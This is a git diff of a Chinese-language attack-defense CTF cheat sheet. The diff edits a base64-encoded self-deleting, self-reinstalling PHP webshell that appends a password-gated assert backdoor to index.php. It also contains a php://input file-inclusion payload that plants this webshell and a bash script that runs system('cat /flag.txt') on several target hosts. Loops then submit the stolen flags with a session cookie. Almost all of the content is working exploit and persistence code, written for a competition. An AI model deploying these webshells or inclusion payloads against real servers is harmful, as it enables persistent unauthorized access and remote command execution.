@@ -87,12 +87,12 @@ file_put_contents('index.php','<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="
 while(1){
   @eval($code);
   sleep(30); 
-};
+}
 ?>
 ```
 加密：
 ```
-PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+
+PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn0KPz4=
 ```
 不死马加入到index.php的一句话木马：
 
@@ -109,7 +109,7 @@ http://172.16.2.234:8011/include.php?filename=php://input
 
 POST：
 ```
-<?php file_put_contents("/var/www/html/s1.php",base64_decode("PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+"));?>
+<?php file_put_contents("/var/www/html/s1.php",base64_decode("PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn0KPz4="));?>
 ```
 
 然后访问根目录s1.php， http://172.16.2.234:8011/s1.php 即可追加一句话木马到index.php，循环往复。
@@ -127,8 +127,35 @@ while (true);do echo test >/var/www/html/shell.php;done &
 
 ## 批量提交flag
 #### if题目要求只提交flag：
+批量GET FLAG：
+```
+#!/bin/bash
+for i in {1..3}
+do
+	for h in {1..3}
+	do
+		echo flag80$i$h
+		curl 172.16.2.234:80$i$h/include.php?filename=php://input --data "<?php system('cat /flag.txt');?>" --max-time 3 -s
+		echo flag80$i$h
+		curl 172.16.2.234:80$i$h/.s.php --data "1=system('cat /flag.txt');" --max-time 3 -s
+		echo flag80$i$h
+	done
+done
+```
+```
+bash 1.sh >>2.txt
+leafpad 2.txt
+```
+编辑，去掉多余部分，留下每行flag：
 ```
 for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";done
+```
+如果题目有提交间隔限制，如10s
+```
+vi编辑，去掉多余部分，留下每行flag：
+```
+for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";sleep 11s;done
+```
 ```
 #### if题目要求提交ip和flag
 ```
